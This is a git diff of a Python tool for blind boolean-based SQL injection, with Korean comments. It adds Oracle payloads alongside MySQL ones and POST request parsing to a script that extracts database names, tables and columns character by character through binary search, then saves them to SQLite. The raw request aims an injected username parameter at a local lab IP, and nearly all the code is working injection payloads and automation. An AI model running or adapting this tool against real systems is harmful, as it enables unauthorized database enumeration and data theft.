@@ -1,24 +1,8 @@
 # 
 ####################
-# 1. --basic 선택 시 에러 해결 -> 완료
 # 2. POST 문제 해결
-# 3. 다른 데이터베이스 페이로드 생성
-# 4. 데이터 출력 구현,  조회해서 나온 값을 (테이블 생성하고 각 컬럼들 값들을 SQLite에 그대로 저장)
-
-# DROP TABLE users1; # 삭제해야됨
-
-# SELECT username FROM users WHERE username like '%'||(CASE WHEN 1=1 THEN 'kazal92' ELSE 'test' END)||'%' # 조건식
-# (SELECT table_name FROM (SELECT rownum r, table_name FROM all_tables WHERE owner='C##KAZAL92')tb WHERE tb.r=1) # 페이로드 (테이블)
-
-# SELECT global_name FROM global_name;  # List Databases	# XE
-# SELECT DISTINCT owner FROM all_tables; # DB(USER)
-# SELECT table_name FROM all_tables WHERE owner='C##KAZAL92' # 테이블
-# SELECT * FROM all_tab_columns WHERE owner='C##KAZAL92' AND table_name='USERS'; #컬럼
-# 
-
-# SELECT username FROM users WHERE username like '%'||(CASE WHEN 1=1 THEN 'kazal92' ELSE 'test' END)||'%' # 조건식
-# ascii(SUBSTR((SELECT table_name FROM (SELECT rownum r, table_name FROM all_tables WHERE owner='C##KAZAL92')tb WHERE tb.r=1),1,1))=68 # 
-# (SELECT table_name FROM (SELECT rownum r, table_name FROM all_tables WHERE owner='C##KAZAL92')tb WHERE tb.r=1);###############
+# 3. 다른 데이터베이스 페이로드 생성 # MYSQL, ORACLE 완료
+# 4. 데이터 출력 구현,  조회해서 나온 값을 (테이블 생성하고 각 컬럼들 값들을 SQLite에 테이블 그대로 복사느낌으로 저장)
 
 # -*- coding: utf-8 -*-   
 from time import sleep
@@ -37,18 +21,34 @@ true_message_size = None # 참(ture)의 경우 message size
 
 
 REQUEST_STRING = """
-GET /?username='||(case+when+1=1+then+'kazal92'+else+'test'+end)||'&password=1234 HTTP/1.1
-Host: 192.168.0.32:5001
+POST / HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36
+Accept-Encoding: gzip, deflate, br
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Connection: keep-alive
+Host: 192.168.219.100:5001
 Accept-Language: ko-KR,ko;q=0.9
 Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-Accept-Encoding: gzip, deflate, br
 Cookie: security_level=0; PHPSESSID=117eca5e7194d9415b200e7a15200933
-Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 83
+
+username='%7C%7C(case+when+1=1+then+'kazal92'+else+'test'+end)%7C%7C'&password=1234"""
 
 
-"""
+# REQUEST_STRING = """
+# GET /?username='||(case+when+1=1+then+'kazal92'+else+'test'+end)||'&password=1234 HTTP/1.1
+# User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36
+# Accept-Encoding: gzip, deflate, br
+# Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+# Connection: keep-alive
+# Host: 192.168.219.100:5001
+# Accept-Language: ko-KR,ko;q=0.9
+# Upgrade-Insecure-Requests: 1
+# Cookie: security_level=0; PHPSESSID=117eca5e7194d9415b200e7a15200933
+
+
+# """
 
 class Colors:
 	""" ANSI color codes """
@@ -102,8 +102,6 @@ class ArgumentProcessor:
 		parser.add_argument("-D", dest="select_db", help="select DB")
 		parser.add_argument("-T", dest="select_table", help="select Table")
 		parser.add_argument("-C", dest="select_column", help="select Column")
-		# parser.add_argument("-C", type=str, help="select Table")
-
 		parser.add_argument("--proxy", dest="proxy", help="Use a proxy to connect to the target URL")
 		parser.add_argument("--dbms", dest="dbms", help="SELECT DBMS : MySQL, Oracle, MSSQL, PostgreSQL")
 		parser.add_argument("--basic", action="store_true", help="Basic info extraction")
@@ -120,7 +118,7 @@ class SQLiteProcessor:
 	@classmethod
 	def __init__(cls):
 		global cursor, conn
-		conn = sqlite3.connect(args.result_db)  # try 사용
+		conn = sqlite3.connect(args.result_db) 
 		cursor = conn.cursor()
 
 		# 기본 테이블 생성 (DB, Table, Column)
@@ -157,13 +155,16 @@ def url_decode(item):
 	return urllib.parse.unquote(item).replace('+', ' ')
 
 def parse_request(request):
-	lines = request.split("\n") # 한줄씩 쪼개서 넣기
-	method, path_param, http_ver = lines[1].split() # POST /v1/groups/814a75c9-f187-48c8-8c01-a9805212db0e/files/details?AAA=aaa&BBB=bbb HTTP/2
 	headers = {} # 헤더 딕셔너리
 	data = {} # GET 파라미터 딕셔너리
-	path, param_tmp = path_param.split("?") # param = AAA=aaa&BBB=bbb
-	param = param_tmp
+
+	lines = request.split("\n") # 한줄씩 쪼개서 넣기
+	method, path_param, http_ver = lines[1].split() # POST /v1/groups/814a75c9-f187-48c8-8c01-a9805212db0e/files/details?AAA=aaa&BBB=bbb HTTP/2
+
 	if method == 'GET': # GET방식일경우 
+		path, param_tmp = path_param.split("?") # param = AAA=aaa&BBB=bbb
+		param = param_tmp
+
 		for line in lines[2:]:
 			if ":" in line:
 				key, value = line.split(": ")
@@ -175,14 +176,18 @@ def parse_request(request):
 		condition = url_decode(data[args.parameter])
 
 	else: # 이외 POST 등 일경우 body 값 파싱
-		headers_string, data_string = REQUEST_STRING.split("\n\n")
+		path = path_param.split("?", 1)[0]
+		headers_string, data_string = request.split("\n\n")
 		for line in headers_string.split("\n"):
 			if ":" in line:
 				key, value = line.split(": ")
 				headers[key] = value
+		
 		for param in data_string.split("&"):
-			key, value = param.split("=")
+			key, value = param.split("=", 1)
 			data[key] = value
+		url = headers['Host']   
+		condition = url_decode(data[args.parameter])
 
 	return (
 	{
@@ -210,7 +215,7 @@ def setpayload():
 
 	if dbms == 'oracle':
 		if args.basic:
-			print(f"{Colors.LIGHT_RED}{Colors.UNDERLINE}[*] MySQL 기본 정보 출력 Start{Colors.END}\n")
+			print(f"{Colors.LIGHT_RED}{Colors.UNDERLINE}[*] ORACLE 기본 정보 출력 Start{Colors.END}\n")
 			payloads = {
 				'Version': {
 					'count': "",
@@ -224,33 +229,35 @@ def setpayload():
 				},
 			}
 		if args.dbs:
-			print(f"{Colors.LIGHT_RED}{Colors.UNDERLINE}[*] MySQL DB 출력 Start{Colors.END}\n")
+			print(f"{Colors.LIGHT_RED}{Colors.UNDERLINE}[*] ORACLE DB 출력 Start{Colors.END}\n")
 			payloads = {
 				'Dbs': {
-					'count' : "(SELECT count(*) FROM information_schema.schemata WHERE schema_name NOT IN('mysql','information_schema'))>{mid_val}",
-					'len' : "(SELECT length((SELECT schema_name FROM information_schema.schemata WHERE schema_name NOT IN('mysql','information_schema') LIMIT {rows},1)))>{mid_val}",
-					'dbs' : "ascii(substr((SELECT schema_name FROM information_schema.schemata WHERE schema_name NOT IN('mysql','information_schema') LIMIT {rows},1),{substr_index},1))>{mid_val}"
+					'count' : "(SELECT count(*) FROM (SELECT DISTINCT owner FROM all_tables))>{mid_val}",
+					'len' : "LENGTH((SELECT owner FROM (SELECT rownum r, owner FROM (SELECT DISTINCT owner FROM all_tables))tb WHERE tb.r={rows}))>{mid_val}",
+					'dbs' : "ASCII(SUBSTR((SELECT owner FROM (SELECT rownum r, owner FROM (SELECT DISTINCT owner FROM all_tables))tb WHERE tb.r={rows}),{substr_index},1))>{mid_val}"
 				}
 			}
 		if args.tables:
-			print(f"{Colors.LIGHT_RED}{Colors.UNDERLINE}[*] MySQL 테이블 출력 Start{Colors.END}\n")
+			print(f"{Colors.LIGHT_RED}{Colors.UNDERLINE}[*] ORACLE 테이블 출력 Start{Colors.END}\n")
 			payloads = {
 				'Tables': {
-					'count' : "(SELECT count(*) FROM information_schema.tables WHERE table_schema NOT IN('mysql','information_schema') AND table_schema IN('{select_db}'))>{mid_val}",
-					'len' : "SELECT * FROM (SELECT rownum r, table_name FROM all_tables)tb WHERE tb.r=1;",
-					'tables' : "ascii(substr((SELECT table_name FROM information_schema.tables WHERE table_schema NOT IN('mysql','information_schema') AND table_schema IN('{select_db}') LIMIT {rows},1),{substr_index},1))>{mid_val}"
-				}
+					'count' : "(SELECT count(*) FROM all_tables WHERE owner='{select_db}')>{mid_val}",
+					'len' : "LENGTH((SELECT table_name FROM (SELECT rownum r, table_name FROM all_tables WHERE owner='{select_db}')tb WHERE tb.r={rows}))>{mid_val}",
+					'tables' : "ascii(SUBSTR((SELECT table_name FROM (SELECT rownum r, table_name FROM all_tables WHERE owner='{select_db}')tb WHERE tb.r={rows}),{substr_index},1))>{mid_val}"
+				}	
 			}
 		if args.columns:
-			print(f"{Colors.LIGHT_RED}{Colors.UNDERLINE}[*] MySQL 컬럼 출력 Start{Colors.END}\n")
+			print(f"{Colors.LIGHT_RED}{Colors.UNDERLINE}[*] ORACLE 컬럼 출력 Start{Colors.END}\n")
 			payloads = {
 				'Columns': {
-					'count' : "(SELECT count(*) FROM information_schema.columns WHERE table_schema NOT IN('mysql','information_schema') AND table_schema IN('{select_db}') AND table_name IN('{select_table}'))>{mid_val}",
-					'len' : "(SELECT length((SELECT column_name FROM information_schema.columns WHERE table_schema NOT IN('mysql','information_schema') AND table_schema IN('{select_db}') AND table_name IN('{select_table}') LIMIT {rows},1)))>{mid_val}",
-					'columns' : "ascii(substr((SELECT column_name FROM information_schema.columns WHERE table_schema NOT IN('mysql','information_schema') AND table_schema IN('{select_db}') AND table_name IN('{select_table}') LIMIT {rows},1),{substr_index},1))>{mid_val}"
+					'count' : "(SELECT count(*) FROM all_tab_columns WHERE owner='{select_db}' AND table_name='{select_table}')>{mid_val}",
+					'len' : "LENGTH((SELECT column_name FROM (SELECT rownum r, column_name FROM all_tab_columns WHERE owner='{select_db}' AND table_name='{select_table}')tb WHERE tb.r={rows}))>{mid_val}",
+					'columns' : "ASCII((SUBSTR((SELECT column_name FROM (SELECT rownum r, column_name FROM all_tab_columns WHERE owner='{select_db}' AND table_name='{select_table}')tb WHERE tb.r={rows}),{substr_index},1)))>{mid_val}"
 				}
 			}
-			
+					# 오라클
+####################################################################################################################################################################################################
+					# MYSQL
 	elif dbms == 'mysql':
 		if args.basic:
 			print(f"{Colors.LIGHT_RED}{Colors.UNDERLINE}[*] MySQL 기본 정보 출력 Start{Colors.END}\n")
@@ -293,39 +300,12 @@ def setpayload():
 					'columns' : "ascii(substr((SELECT column_name FROM information_schema.columns WHERE table_schema NOT IN('mysql','information_schema') AND table_schema IN('{select_db}') AND table_name IN('{select_table}') LIMIT {rows},1),{substr_index},1))>{mid_val}"
 				}
 			}
-		# else:
-		# 	print("Use --help for more info. (mysql)")
-		# 	print(f"args.basic: {args.basic}, args.dbs: {args.dbs}, args.tables: {args.tables}, args.columns: {args.columns}")
-
-	# elif dbms == 'mssql':
-	# 	if args.basic:
-	# 		print("[*] MSSQL 기본 정보 출력 Start")
-	# 		payloads = "----------------------------------------"
-	# 	elif args.dbs:
-	# 		print("[*] MSSQL DB 출력 Start")
-	# 		payloads = "----------------------------------------"
-	# 	else:
-	# 		print("Use --help for more info. (mssql)")
-
-	# elif dbms == 'postgresql':
-	# 	if args.basic:
-	# 		print("[*] PostgreSQL 기본 정보 출력 Start")
-	# 		payloads = [
-	# 			# "'||(CASE WHEN ascii(substr((SELECT version()),{substr_index},1))>{mid_val} THEN '{message}' ELSE 'Characterization' END)||'",
-	# 			# "'||(CASE WHEN ascii(substr((SELECT version()),{substr_index},1))>{mid_val} THEN '{message}' ELSE '11111' END)||'"
-	# 		]
-	# 	elif args.dbs:
-	# 		print("[*] PostgreSQL DB 출력 Start")
-	# 		payloads = "----------------------------------------"
-	# 	else:
-	# 		print("Use --help for more info. (postgresql)")
-
-	# else:
-	# 	print("Unsupported DBMS. Use --help for more info.")
-	
+		
 	return payloads
 
 def check_condition(data, method, url, path, headers):
+	data[args.parameter] = url_decode(data[args.parameter])
+
 	global true_message_size
 	params = '&'.join([f"{key}={value}" for key, value in data.items()])      
 	proxies = {'http': args.proxy, 'https': args.proxy}
@@ -333,15 +313,18 @@ def check_condition(data, method, url, path, headers):
 	if method == 'GET':
 		url = f"{args.schema}://{url}{path}?{params}" # HTTP , HTTPS 입력 sechma
 		response = requests.request(method, url, headers=headers, proxies=proxies, timeout=timeout, verify=False)
-		true_message_size = len(response.content)
+		true_message_size = len(response.content) # 저장
 	else:
 		url = f"{args.schema}://{url}{path}" # HTTP , HTTPS 입력 sechma
 		response = requests.request(method, url, headers=headers, data=data, proxies=proxies, timeout=timeout, verify=False)
+		true_message_size = len(response.content) # 저장
+
 	
-def recursive(min_val, max_val, data_val, payload_fix, substr_index=None, rows=None, select_db=None, select_table=None, select_column=None):
+def recursive(min_val, max_val, data_val, payload_fix, substr_index=None, rows_=None, select_db=None, select_table=None, select_column=None):
 	mid_val = int((min_val+max_val)/2)
 	payload_insert = payload_fix
-	payload_insert = payload_insert.format(rows=rows, substr_index=substr_index, mid_val=mid_val, select_db=select_db, select_table=select_table, select_column=select_column)
+	
+	payload_insert = payload_insert.format(rows=rows_, substr_index=substr_index, mid_val=mid_val, select_db=select_db, select_table=select_table, select_column=select_column)
 	# print(payload_insert) # 페이로드 확인
 	data_val['data'][args.parameter] = payload_insert
 	
@@ -351,12 +334,13 @@ def recursive(min_val, max_val, data_val, payload_fix, substr_index=None, rows=N
 			return max_val
 		return min_val         
 	if bin_result: # 30 130 160 / 2 = 80
-		return recursive(mid_val, max_val, data_val, payload_fix, substr_index, rows, select_db, select_table, select_column)
-	return     recursive(min_val, mid_val, data_val, payload_fix, substr_index, rows, select_db, select_table, select_column)
+		return recursive(mid_val, max_val, data_val, payload_fix, substr_index, rows_, select_db, select_table, select_column)
+	return     recursive(min_val, mid_val, data_val, payload_fix, substr_index, rows_, select_db, select_table, select_column)
 		
 def connection(data, method, url, path, headers):
+	
 	data[args.parameter] = url_decode(data[args.parameter])
-	data[args.parameter] = url_encode(data[args.parameter])
+
 	params = '&'.join([f"{key}={value}" for key, value in data.items()])      
 	# print(params) # 요청전 최종 페이로드 확인
 	proxies = {'http': args.proxy, 'https': args.proxy}
@@ -364,11 +348,14 @@ def connection(data, method, url, path, headers):
 	if method == 'GET':
 		url = f"{args.schema}://{url}{path}?{params}" # HTTP , HTTPS 입력 sechma
 		response = requests.request(method, url, headers=headers, proxies=proxies, timeout=timeout, verify=False)
+		check_message_size = response.content
+
 	else:
 		url = f"{args.schema}://{url}{path}" # HTTP , HTTPS 입력 sechma
 		response = requests.request(method, url, headers=headers, data=data, proxies=proxies, timeout=timeout, verify=False)
+		check_message_size = len(response.content)
 
-	if true_message_size == len(response.content):
+	if true_message_size == check_message_size:
 		return 1    # true
 	return 0    # false
 
@@ -378,18 +365,14 @@ def query_start():
 	result_tmp = []
 	result_data = {}
 	data_len  = 0
-	# dic = {} # name_str_list 2차원 배열을 엑셀에 넣기위해 딕셔너리형으로 변환 해서 넣을 변수
 	select_tables = [None] # --dbs, --tables 를 실행할때는 None으로 설정
+	dbms = args.dbms.lower()
 
 	payloads = setpayload() # 인수에 따른 페이로드 셋팅
 	data, condition = parse_request(REQUEST_STRING) # 응답데이터 파싱
 	check_condition(**data) # True 응답 길이 저장 (참거짓 구분 용도) 	
 	result_payload = payload_set(condition, payloads) # 조건식에서 1=1 을 페이로드로 리플레이스
-	# for key, value in payloads.items():
-	# 	payload_tmp = condition.replace('1=1', value) # 조건식에서 1=1 을 페이로드로 리플레이스
-	# 	result_payload[key] = payload_tmp
 
-	# test = list(payloads.keys())[1]
 
 	if args.select_table != None: # 테이블의 컬럼을 여러개 선택하는 경우 ex) -C blog, movies
 		select_tables = [] # --Columns의 경우 None 값 초기화
@@ -404,15 +387,17 @@ def query_start():
 				row_count = recursive(0, 127, data, result_payload[key]['count'],None, None, args.select_db, select_table_one, None)
 		else:
 			row_count = 1
-		print(f"{Colors.LIGHT_BLUE}[*] '{select_table_one}' 레코드 수 : {str(row_count)}{Colors.END}" if select_table_one else f"{Colors.LIGHT_BLUE}[*] 레코드 수 : {str(row_count)}{Colors.END}")
+		print(f"{Colors.LIGHT_BLUE}[*] '{Colors.LIGHT_BLUE}{select_table_one}'{Colors.END} {Colors.LIGHT_PURPLE}라인 개수 : {str(row_count)}{Colors.END}" if select_table_one else f"{Colors.LIGHT_BLUE}[*] 레코드 수 : {str(row_count)}{Colors.END}")
 
 		for rows in range(0, row_count, 1):  # 레코드 갯수 만큼 반복  # range(row_count)로 해도됨
 			for key, value in result_payload.items():
 				name_tmp.append(key)
 				for key2, value2 in list(value.items())[1:]: #딕셔너리를 리스트로 변환 후 첫번째 값(count)는 제외하고 실행 
 					if key2 == 'len':
+						if dbms == 'oracle': # 오라클일 경우 rownum은 1부터 시작하기에 + 1 해야됨
+							rows+=1 		 # 길이를 구하고 이름을 뽑고하는 방식이기 때문에 길이를 구할때만 +1하면됨
 						data_len  = recursive(0, 127, data, value2, None, rows, args.select_db, select_table_one, None)
-						print(f"[*] 데이터 길이 : " + str(data_len))
+						print(f"[*] 길이 : " + str(data_len))
 					else:
 						name_str = ""
 						for substr_index in range(0, data_len, 1): # 데이터 글자 수 만큼 반복
@@ -420,7 +405,7 @@ def query_start():
 							# print(name_str)
 						SQLiteProcessor.result_set_name(name_str, select_table_one, key) # SQLite에 데이터 저장
 						result_tmp.append(name_str)
-						print(result_tmp)
+						print(f"[*] {result_tmp}")
 
 			
 		if args.basic :
@@ -428,20 +413,20 @@ def query_start():
 			for name in name_tmp:
 				result_data[name] = result_tmp[num]
 				num = num + 1
-				print(f"{Colors.LIGHT_BLUE}[*] 데이터 : {result_data}{Colors.END}")
+				print(f"{Colors.LIGHT_BLUE}[*] {Colors.END}{Colors.GREEN}{result_data}{Colors.END}")
 		else:
 			if select_table_one:
 				result_data[select_table_one] = result_tmp
 			else:
 				result_data[list(name_tmp)[0]] = result_tmp
-			print(f"{Colors.LIGHT_BLUE}[*] '{select_table_one}' 데이터 : {result_data[select_table_one]}{Colors.END}" if select_table_one else f"{Colors.LIGHT_BLUE}[*] '{list(name_tmp)[0]}' 데이터 : {result_data[list(name_tmp)[0]]}{Colors.END}")
-		# print(f"{Colors.LIGHT_BLUE}[*] 데이터 : {result_data}{Colors.END}")	
+			print(f"{Colors.LIGHT_BLUE}[*] '{select_table_one}' {Colors.END} : {Colors.GREEN}{result_data[select_table_one]}{Colors.END}" if select_table_one else f"{Colors.LIGHT_BLUE}[*] '{list(name_tmp)[0]}' 데이터 : {result_data[list(name_tmp)[0]]}{Colors.END}")
 		result_tmp = [] # 레코드 모두 추출 후 초기화
 
-	print(f"{Colors.LIGHT_RED}[*] SQLite 저장 완료{Colors.END}")
 	print(f"\n{Colors.LIGHT_RED}{Colors.BOLD}{Colors.UNDERLINE}[*] 최종 결과{Colors.END}")
 	for key, value in result_data.items(): 
 		print(f"{Colors.LIGHT_BLUE}{key}{Colors.END} : {Colors.GREEN}{value}{Colors.END}")
+	print(f"\n{Colors.LIGHT_RED}[*] SQLite 저장 완료!{Colors.END}")
+
 	print("\n")	
 		
 if __name__ == '__main__':
